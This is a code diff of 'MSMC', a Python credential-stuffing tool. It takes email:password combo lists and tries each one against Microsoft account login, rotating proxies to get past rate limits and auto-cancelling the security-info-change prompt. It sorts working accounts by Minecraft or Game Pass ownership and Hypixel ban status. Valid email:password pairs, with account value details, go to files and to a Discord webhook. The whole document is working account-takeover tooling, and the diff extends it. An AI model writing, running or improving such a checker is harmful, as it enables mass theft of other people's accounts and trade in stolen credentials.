@@ -1,9 +1,17 @@
-import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings
+import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
 from datetime import datetime, timezone
 from colorama import Fore
 from console import utils
 from tkinter import filedialog
 from urllib.parse import urlparse, parse_qs
+from io import StringIO
+
+#banchecking
+from minecraft.networking.connection import Connection
+from minecraft.authentication import AuthenticationToken, Profile
+from minecraft.networking.connection import Connection
+from minecraft.networking.packets import clientbound
+from minecraft.exceptions import LoginDisconnect
 
 logo = Fore.GREEN+'''
      ███▄ ▄███▓  ██████  ███▄ ▄███▓ ▄████▄  
@@ -16,15 +24,15 @@ logo = Fore.GREEN+'''
     ░      ░   ░  ░  ░  ░      ░   ░        
            ░         ░         ░   ░ ░      
                                    ░        \n'''
-sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F" \
-             "&redirect_uri=https://login.live.com/oauth20_desktop.srf" \
-             "&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
+sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 Combos = []
 proxylist = []
+banproxies = []
 fname = ""
-hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,bedrock = 0,0,0,0,0,0,0,0,0,0,0,0,0
+hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
 urllib3.disable_warnings() #spams warnings because i send unverified requests for debugging purposes
 warnings.filterwarnings("ignore") #spams python warnings on some functions, i may be using some outdated things...
+#sys.stderr = open(os.devnull, 'w') #bancheck prints errors in cmd
 
 class Config:
     def __init__(self):
@@ -39,26 +47,28 @@ class Config:
 config = Config()
 
 class Capture:
-    def __init__(self, email, password, name, capes, token):
+    def __init__(self, email, password, name, capes, uuid, token, type):
         self.email = email
         self.password = password
         self.name = name
         self.capes = capes
+        self.uuid = uuid
         self.token = token
+        self.type = type
         self.hypixl = None
         self.level = None
         self.firstlogin = None
         self.lastlogin = None
         self.cape = None
-        self.capes = None
         self.access = None
         self.sbcoins = None
         self.bwstars = None
+        self.banned = None
         self.namechanged = None
         self.lastchanged = None
 
     def builder(self):
-        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}"
+        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
         if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
         if self.level != None: message+=f"\nHypixel Level: {self.level}"
         if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
@@ -67,6 +77,7 @@ class Capture:
         if self.access != None: message+=f"\nEmail Access: {self.access}"
         if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
         if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
+        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
         if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
         if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
         return message+"\n============================\n"
@@ -88,8 +99,10 @@ class Capture:
                     .replace("<access>", self.access or "N/A")
                     .replace("<skyblockcoins>", self.sbcoins or "N/A")
                     .replace("<bedwarsstars>", self.bwstars or "N/A")
+                    .replace("<banned>", self.banned or "Unknown")
                     .replace("<namechange>", self.namechanged or "N/A")
-                    .replace("<lastchanged>", self.lastchanged or "N/A"),
+                    .replace("<lastchanged>", self.lastchanged or "N/A")
+                    .replace("<type>", self.type or "N/A"),
                 "username": "MSMC"
             }
             requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"})
@@ -147,48 +160,130 @@ class Capture:
     
     def namechange(self):
         if config.get('namechange') is True or config.get('lastchanged') is True:
-            try:
-                check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
-                if check.status_code == 200:
-                    data = check.json()
-                    if config.get('namechange') is True:
-                        self.namechanged = str(data['nameChangeAllowed'])
-                    if config.get('lastchanged') is True:
-                        given_date = datetime.strptime(data['createdAt'], "%Y-%m-%dT%H:%M:%S.%fZ").replace(tzinfo=timezone.utc)
-                        formatted = given_date.strftime("%m/%d/%Y")
-                        current_date = datetime.now(timezone.utc)
-                        difference = current_date - given_date
-                        years = difference.days // 365
-                        months = difference.days % 365 // 30
-                        days = difference.days
-                        if years > 0:
-                            return f"{years} {'year' if years == 1 else 'years'} - {formatted} - {data['createdAt']}"
-                        elif months > 0:
-                            return f"{months} {'month' if months == 1 else 'months'} - {formatted} - {data['createdAt']}"
-                        else:
-                            self.lastchanged = f"{difference.days} {'day' if days == 1 else 'days'} - {formatted} - {data['createdAt']}"
-                if check.status_code == 429:
-                    Capture.namechange(self)
-            except:
-                Capture.namechange(self)
+            tries = 0
+            while tries < maxretries:
+                try:
+                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
+                    if check.status_code == 200:
+                        try:
+                            data = check.json()
+                            if config.get('namechange') is True:
+                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
+                            if config.get('lastchanged') is True:
+                                created_at = data.get('createdAt')
+                                if created_at:
+                                    try:
+                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
+                                    except ValueError:
+                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
+                                    given_date = given_date.replace(tzinfo=timezone.utc)
+                                    formatted = given_date.strftime("%m/%d/%Y")
+                                    current_date = datetime.now(timezone.utc)
+                                    difference = current_date - given_date
+                                    years = difference.days // 365
+                                    months = (difference.days % 365) // 30
+                                    days = difference.days
+
+                                    if years > 0:
+                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
+                                    elif months > 0:
+                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
+                                    else:
+                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
+                                    break
+                        except: pass
+                    if check.status_code == 429:
+                        if len(proxylist) < 5: time.sleep(20)
+                        Capture.namechange(self)
+                except: pass
+                tries+=1
+                retries+=1
     
+    def ban(self):
+        global errors
+        if config.get('hypixelban') is True:
+            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
+            auth_token.profile = Profile(id_=self.uuid, name=self.name)
+            tries = 0
+            while tries < maxretries:
+                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47)
+                @connection.listener(clientbound.login.DisconnectPacket, early=True)
+                def login_disconnect(packet):
+                    data = json.loads(str(packet.json_data))
+                    if "Suspicious activity" in str(data):
+                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
+                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                    elif "temporarily banned" in str(data):
+                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
+                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                    elif "You are permanently banned from this server!" in str(data):
+                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
+                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                    elif "The Hypixel Alpha server is currently closed!" in str(data):
+                        self.banned = "False"
+                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                    elif "Failed cloning your SkyBlock data" in str(data):
+                        self.banned = "False"
+                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                    else:
+                        self.banned = ''.join(item["text"] for item in data["extra"])
+                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                @connection.listener(clientbound.play.JoinGamePacket, early=True)
+                def joined_server(packet):
+                    if self.banned == None:
+                        self.banned = "False"
+                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                try:
+                    if len(banproxies) > 0:
+                        proxy = random.choice(banproxies)
+                        if '@' in proxy:
+                            atsplit = proxy.split('@')
+                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
+                        else:
+                            ip_port = proxy.split(':')
+                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
+                        socket.socket = socks.socksocket
+                    original_stderr = sys.stderr
+                    sys.stderr = StringIO()
+                    try: 
+                        connection.connect()
+                        c = 0
+                        while self.banned == None or c < 1000:
+                            time.sleep(.01)
+                            c+=1
+                        connection.disconnect()
+                    except: pass
+                    sys.stderr = original_stderr
+                except: pass
+                if self.banned != None: break
+                tries+=1
+
     def handle(self):
-        global hits, mfa, sfa, cpm, checked
-        if screen == "'2'": print(Fore.GREEN+f"Hit: {self.name} | {self.email}:{self.password}")
+        global hits
         hits+=1
-        checked+=1
-        cpm+=1
+        if screen == "'2'": print(Fore.GREEN+f"Hit: {self.name} | {self.email}:{self.password}")
         with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
-        Capture.hypixel(self)
-        Capture.optifine(self)
-        Capture.full_access(self)
-        Capture.namechange(self)
+        if self.name != 'N/A':
+            try: Capture.hypixel(self)
+            except: pass
+            try: Capture.optifine(self)
+            except: pass
+            try: Capture.full_access(self)
+            except: pass
+            try: Capture.namechange(self)
+            except: pass
+            try: Capture.ban(self)
+            except: pass
         open(f"results/{fname}/Capture.txt", 'a').write(Capture.builder(self))
         Capture.notify(self)
-
+class Login:
+    def __init__(self, email, password):
+        self.email = email
+        self.password = password
+        
 def get_urlPost_sFTTag(session):
     global retries
-    while True: #will retry forever until it gets a working request.
+    while True: #will retry forever until it gets a working request/url.
         try:
             r = session.get(sFTTag_url, timeout=15)
             text = r.text
@@ -202,101 +297,55 @@ def get_urlPost_sFTTag(session):
         session.proxy = getproxy()
         retries+=1
 
-def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
+def get_xbox_rps(session, email, password, urlPost, sFTTag):
     global bad, checked, cpm, twofa, retries, checked
-    try:
-        data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
-        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
-        if '#' in login_request.url and login_request.url != sFTTag_url:
-            #print(login_request.url)
-            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
-            if token != "None":
-                return token, session
-            else:
-                if tries < maxretries:
-                    session.proxy = getproxy()
-                    retries+=1
-                    tries+=1
-                    return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
-                else:
-                    bad+=1
-                    checked+=1
-                    cpm+=1
-                    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-                    return "None", session
-        #sec info change
-        elif 'cancel?mkt=' in login_request.text:
-            data = {'ipt':re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(), 'pprid':re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(), 'uaid':re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()}
-            ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
-            fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
-            token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
-            if token != "None":
-                return token, session
-            else:
-                if tries < maxretries:
-                    session.proxy = getproxy()
-                    retries+=1
-                    tries+=1
-                    return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
-                else:
-                    bad+=1
-                    checked+=1
-                    cpm+=1
-                    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-                    return "None", session
-        elif "tried to sign in too many times with an incorrect account or password." in login_request.text:
-            if tries < maxretries:
-                session.proxy = getproxy()
-                retries+=1
-                tries+=1
-                #if screen == "'2'": print(Fore.LIGHTRED_EX+f"Blocked, retrying: {email}:{password} {Fore.LIGHTBLACK_EX}[{str(tries)}/{str(maxretries)}]")
-                return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
-            else:
+    tries = 0
+    while tries < maxretries:
+        try:
+            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
+            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
+            if '#' in login_request.url and login_request.url != sFTTag_url:
+                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
+                if token != "None":
+                    return token, session
+            elif 'cancel?mkt=' in login_request.text:
+                data = {
+                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
+                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
+                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
+                }
+                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
+                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
+                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
+                if token != "None":
+                    return token, session
+            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
+                twofa+=1
+                checked+=1
+                cpm+=1
+                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
+                with open(f"results/{fname}/2fa.txt", 'a') as file:
+                    file.write(f"{email}:{password}\n")
+                return "None", session
+            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                 bad+=1
                 checked+=1
                 cpm+=1
                 if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                 return "None", session
-        #2fa
-        elif any(value in login_request.text for value in ["recover?mkt" , "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
-            twofa+=1
-            checked+=1
-            cpm+=1
-            if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
-            with open(f"results/{fname}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
-            return "None", session
-        #bad
-        elif any(value in login_request.text for value in ["Your account or password is incorrect." , "That Microsoft account doesn't exist. Enter a different account" , "Sign in to your Microsoft account" ]):
-            bad+=1
-            checked+=1
-            cpm+=1
-            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-            return "None", session
-        #blocked, retry
-        else:
-            if tries < maxretries:
+            else:
                 session.proxy = getproxy()
                 retries+=1
                 tries+=1
-                return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
-            else:
-                bad+=1
-                checked+=1
-                cpm+=1
-                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-                return "None", session
-    except:
-        if tries < maxretries:
+        except:
             session.proxy = getproxy()
             retries+=1
             tries+=1
-            return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
-        else:
-            bad+=1
-            checked+=1
-            cpm+=1
-            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
-            return "None", session
+    bad+=1
+    checked+=1
+    cpm+=1
+    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
+    return "None", session
 
 def validmail(email, password):
     global vm, cpm, checked
@@ -304,74 +353,99 @@ def validmail(email, password):
     cpm+=1
     checked+=1
     with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
-    if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Valid Mail: {email}:{password}")
+    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")
 
-def checkmc(session, email, password, token):
-    global retries, bedrock, cpm, checked
-    checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
-    if checkrq.status_code == 200:
-        if 'game_minecraft' in checkrq.text or 'product_minecraft' in checkrq.text:
-            if 'game_minecraft_bedrock' in checkrq.text:
-                bedrock+=1
-                cpm+=1
-                checked+=1
-                with open(f"results/{fname}/Bedrock.txt", 'a') as file: file.write(f"{email}:{password}\n")
-                if screen == "'2'": print(Fore.LIGHTYELLOW_EX+f"Minecraft Bedrock: {email}:{password}")
-                return True
-            else:
-                CAPTURE = Capture(email, password, "N/A", "N/A", token)
-                CAPTURE.handle()
-                return True
-    if checkrq.status_code == 429:
-        retries+=1
-        session.proxy = getproxy()
-        return checkmc(session, email, password, token)
-    return False
-
-
-def account(access_token, session):
+def capture_mc(access_token, session, email, password, type):
     global retries
-    try:
-        r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
-        capes = ""
-        if r.status_code == 200:
-            try:
+    while True:
+        try:
+            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
+            if r.status_code == 200:
                 capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
-            except: capes = "Unknown"
-            return r.json()['name'], capes
-        if r.status_code == 429:
+                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type)
+                CAPTURE.handle()
+                break
+            elif r.status_code == 429:
+                retries+=1
+                session.proxy = getproxy()
+                if len(proxylist) < 5: time.sleep(20)
+                continue
+            else: break
+        except:
             retries+=1
             session.proxy = getproxy()
-            return account(access_token, session)
-        else:
-            return None, None
-    except:
-        retries+=1
-        session.proxy = getproxy()
-        return account(access_token, session)
+            continue
 
-def mclogin(session, email, password, uhs, xsts_token):
-    global retries
-    try:
-        mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
-        if mc_login.status_code == 429:
-            session.proxy = getproxy()
-            return mclogin(session, email, password, uhs, xsts_token)
-        else:
-            access_token = mc_login.json().get('access_token')
-            if access_token != None:
-                name, capes = account(access_token, session)
-                if name != None:
-                    CAPTURE = Capture(email, password, name, capes, access_token)
+def checkmc(session, email, password, token):
+    global retries, bedrock, cpm, checked, xgp, xgpu, other
+    while True:
+        checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
+        if checkrq.status_code == 200:
+            if 'product_game_pass_ultimate' in checkrq.text:
+                xgpu+=1
+                cpm+=1
+                checked+=1
+                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
+                with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
+                try: capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
+                except: 
+                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                     CAPTURE.handle()
+                return True
+            elif 'product_game_pass_pc' in checkrq.text:
+                xgp+=1
+                cpm+=1
+                checked+=1
+                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
+                with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
+                capture_mc(token, session, email, password, "Xbox Game Pass")
+                return True
+            elif '"product_minecraft"' in checkrq.text:
+                checked+=1
+                cpm+=1
+                capture_mc(token, session, email, password, "Normal")
+                return True
+            else:
+                others = []
+                if 'product_minecraft_bedrock' in checkrq.text:
+                    others.append("Minecraft Bedrock")
+                if 'product_legends' in checkrq.text:
+                    others.append("Minecraft Legends")
+                if 'product_dungeons' in checkrq.text:
+                    others.append('Minecraft Dungeons')
+                if others != []:
+                    other+=1
+                    cpm+=1
+                    checked+=1
+                    items = ', '.join(others)
+                    open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
+                    if screen == "'2'": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                     return True
                 else:
-                    return checkmc(session, email, password, access_token)
-            else: return False
-    except:
-        retries+=1
-        session.proxy = getproxy()
-        return mclogin(session, email, password, uhs, xsts_token)
+                    return False
+        elif checkrq.status_code == 429:
+            retries+=1
+            session.proxy = getproxy()
+            if len(proxylist) < 1: time.sleep(20)
+            continue
+        else:
+            return False
+
+def mc_token(session, uhs, xsts_token):
+    global retries
+    while True:
+        try:
+            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
+            if mc_login.status_code == 429:
+                session.proxy = getproxy()
+                if len(proxylist) < 1: time.sleep(20)
+                continue
+            else:
+                return mc_login.json().get('access_token')
+        except:
+            retries+=1
+            session.proxy = getproxy()
+            continue
 
 def authenticate(email, password, tries = 0):
     global retries, bad, checked, cpm
@@ -393,14 +467,12 @@ def authenticate(email, password, tries = 0):
                     js = xsts.json()
                     xsts_token = js.get('Token')
                     if xsts_token != None:
-                        hit = mclogin(session, email, password, uhs, xsts_token)
+                        access_token = mc_token(session, uhs, xsts_token)
+                        if access_token != None:
+                            hit = checkmc(session, email, password, access_token)
             except: pass
             if hit == False: validmail(email, password)
-    except Exception as e:
-        #print(e)
-        #traceback.print_exc()
-        #line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
-        #print("Exception occurred at line:", line_number)
+    except:
         if tries < maxretries:
             tries+=1
             retries+=1
@@ -412,7 +484,6 @@ def authenticate(email, password, tries = 0):
             if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
     finally:
         session.close()
-
 
 def Load():
     global Combos, fname
@@ -461,9 +532,9 @@ def logscreen():
     global cpm, cpm1
     cmp1 = cpm
     cpm = 0
-    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Bedrock: {bedrock}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
+    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
     time.sleep(1)
-    threading.Thread(target=logscreen, args=()).start()    
+    threading.Thread(target=logscreen).start()    
 
 def cuiscreen():
     global cpm, cpm1
@@ -477,12 +548,15 @@ def cuiscreen():
     print(f" [{sfa}] SFA")
     print(f" [{mfa}] MFA")
     print(f" [{twofa}] 2FA")
+    print(f" [{xgp}] Xbox Game Pass")
+    print(f" [{xgpu}] Xbox Game Pass Ultimate")
+    print(f" [{other}] Other")
     print(f" [{vm}] Valid Mail")
     print(f" [{retries}] Retries")
     print(f" [{errors}] Errors")
-    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Bedrock: {bedrock}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
+    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
     time.sleep(1)
-    threading.Thread(target=cuiscreen, args=()).start()
+    threading.Thread(target=cuiscreen).start()
 
 def finishedscreen():
     #os.system('cls')
@@ -495,7 +569,9 @@ def finishedscreen():
     print("SFA: "+str(sfa))
     print("MFA: "+str(mfa))
     print("2FA: "+str(twofa))
-    print("Bedrock: "+str(bedrock))
+    print("Xbox Game Pass: "+str(xgp))
+    print("Xbox Game Pass Ultimate: "+str(xgpu))
+    print("Other: "+str(other))
     print("Valid Mail: "+str(vm))
     print(Fore.LIGHTRED_EX+"Press any key to exit.")
     repr(readchar.readkey())
@@ -528,14 +604,18 @@ def Checker(combo):
         checked+=1
 
 def loadconfig():
-    global maxretries
+    global maxretries, config
+    def str_to_bool(value):
+        return value.lower() in ('yes', 'true', 't', '1')
     if not os.path.isfile("config.ini"):
         c = configparser.ConfigParser(allow_no_value=True)
         c['Settings'] = {
             'Webhook': 'paste your discord webhook here',
-            'Max Retries': '5',
+            'Max Retries': 5,
+            'Proxyless Ban Check': False,
             'WebhookMessage': '''@everyone HIT: ||`<email>:<password>`||
 Name: <name>
+Account Type: <type>
 Hypixel: <hypixel>
 Hypixel Level: <level>
 First Hypixel Login: <firstlogin>
@@ -545,6 +625,7 @@ MC Capes: <capes>
 Email Access: <access>
 Hypixel Skyblock Coins: <skyblockcoins>
 Hypixel Bedwars Stars: <bedwarsstars>
+Banned: <banned>
 Can Change Name: <namechange>
 Last Name Change: <lastchanged>'''}
         c['Scraper'] = {
@@ -560,28 +641,31 @@ Last Name Change: <lastchanged>'''}
             'Email Access': True,
             'Hypixel Skyblock Coins': True,
             'Hypixel Bedwars Stars': True,
-            'Name Change Availability': False,
-            'Last Name Change': False
+            'Hypixel Ban': True,
+            'Name Change Availability': True,
+            'Last Name Change': True
         }
         with open('config.ini', 'w') as configfile:
             c.write(configfile)
     read_config = configparser.ConfigParser()
     read_config.read('config.ini')
-    maxretries = int(read_config['Settings']['max retries'])
-    config.set('webhook', str(read_config['Settings']['webhook']))
-    config.set('message', str(read_config['Settings']['webhookmessage']))
-    config.set('autoscrape', int(read_config['Scraper']['auto scrape minutes']))
-    config.set('hypixelname', bool(read_config['Captures']['hypixel name']))
-    config.set('hypixellevel', bool(read_config['Captures']['hypixel level']))
-    config.set('hypixelfirstlogin', bool(read_config['Captures']['first hypixel login']))
-    config.set('hypixellastlogin', bool(read_config['Captures']['last hypixel login']))
-    config.set('optifinecape', bool(read_config['Captures']['optifine cape']))
-    config.set('mcapes', bool(read_config['Captures']['minecraft capes']))
-    config.set('access', bool(read_config['Captures']['email access']))
-    config.set('hypixelsbcoins', bool(read_config['Captures']['hypixel skyblock coins']))
-    config.set('hypixelbwstars', bool(read_config['Captures']['hypixel bedwars stars']))
-    config.set('namechange', bool(read_config['Captures']['name change availability']))
-    config.set('lastchanged', bool(read_config['Captures']['last name change']))
+    maxretries = int(read_config['Settings']['Max Retries'])
+    config.set('webhook', str(read_config['Settings']['Webhook']))
+    config.set('message', str(read_config['Settings']['WebhookMessage']))
+    config.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
+    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
+    config.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
+    config.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
+    config.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
+    config.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
+    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
+    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
+    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
+    config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
+    config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
+    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
+    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
+    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
 
 def get_proxies():
     global proxylist
@@ -626,6 +710,29 @@ def get_proxies():
     time.sleep(config.get('autoscrape') * 60)
     get_proxies()
 
+def banproxyload():
+    global banproxies
+    proxyfile = filedialog.askopenfile(mode='rb', title='Choose a SOCKS5 Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
+    if proxyfile is None:
+        print(Fore.LIGHTRED_EX+"Invalid File.")
+        time.sleep(2)
+        Proxys()
+    else:
+        try:
+            with open(proxyfile.name, 'r+', encoding='utf-8', errors='ignore') as e:
+                ext = e.readlines()
+                for line in ext:
+                    try:
+                        proxyline = line.split()[0].replace('\n', '')
+                        banproxies.append(proxyline)
+                    except: pass
+            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(banproxies)}] lines.")
+            time.sleep(2)
+        except Exception:
+            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
+            time.sleep(2)
